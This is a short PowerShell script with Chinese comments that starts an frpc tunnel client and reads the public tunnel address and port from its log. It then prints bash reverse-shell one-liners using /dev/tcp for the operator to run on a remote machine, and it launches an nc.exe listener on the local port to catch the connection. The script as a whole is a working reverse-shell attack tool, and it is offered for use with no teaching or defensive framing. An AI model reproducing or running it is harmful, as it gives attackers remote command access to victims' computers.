
Start-Process -FilePath ".\Start-Frpc.bat" -NoNewWindow

Write-Host "Waiting for frpc to start..."

Start-Sleep -Seconds 4

# 检查日志文件内容
$logContent = Get-Content -Path ".\frpc\frpc.log" -ErrorAction SilentlyContinue
if ($logContent) {
    Write-Host "FRPC log has been updated."
} else {
    Write-Host "FRPC log is still empty."
}

# 从 frpc\frpc.log 中读取日志内容
$logPath = ".\frpc\frpc.log"

$logContent = Get-Content $logPath -Raw -Encoding UTF8

$logContent = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($logContent))


# 解析隧道信息
$tunnelInfoPattern = "用 \[(.+?):(\d+)\] \S+\s+\S+ IP \S+: \[(.+?):(\d+)\]"

if ($logContent -match $tunnelInfoPattern) {
    $tunnelDomain = $matches[1]
    $tunnelPort = $matches[2]
    $tunnelIP = $matches[3]
    if (-not $tunnelPort) {
        $tunnelPort = $matches[4]
    }
    Write-Host "[OK] Tunnel Domain: $tunnelDomain, Tunnel IP: $tunnelIP, Tunnel Port: $tunnelPort"
} else {
    Write-Host "Error: Tunnel information not found."
}

# 解析本地端口
$localPortPattern = ": \[.+?, tcp -> 127\.0\.0\.1:(\d+)\]"
if ($logContent -match $localPortPattern) {
    $localPort = $matches[1]
    Write-Host "Local Port: $localPort"
} else {
    Write-Host "Error: Local port not found."
}

# 输出连接指令
if ($tunnelDomain -and $tunnelIP -and $tunnelPort) {
    $bashCommand1 = "bash -i >& /dev/tcp/$tunnelDomain/$tunnelPort 0>&1"
    $bashCommand2 = "bash -i >& /dev/tcp/$tunnelIP/$tunnelPort 0>&1"
    Write-Host "[OK]Use either of these commands on your remote host to get a shell:"
    Write-Host $bashCommand1
    Write-Host $bashCommand2
}

# 启动 nc 监听本地端口
if ($localPort) {
    Start-Process -FilePath ".\nc\nc.exe" -ArgumentList "-lvnp $localPort"
}
